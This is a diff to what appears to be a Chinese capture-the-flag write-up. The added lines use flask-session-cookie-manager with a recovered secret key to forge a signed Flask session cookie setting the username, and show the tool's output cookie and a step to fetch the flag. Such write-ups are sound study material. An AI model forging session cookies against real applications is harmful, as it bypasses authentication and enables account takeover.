@@ -161,3 +161,9 @@ PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3
 [Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
 ```
 我们这里需要`username=fuck`，用工具改一下：
+```bash
+PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
+eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
+```
+然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
+![500](assets/Day%203/file-20251220030430083.png)
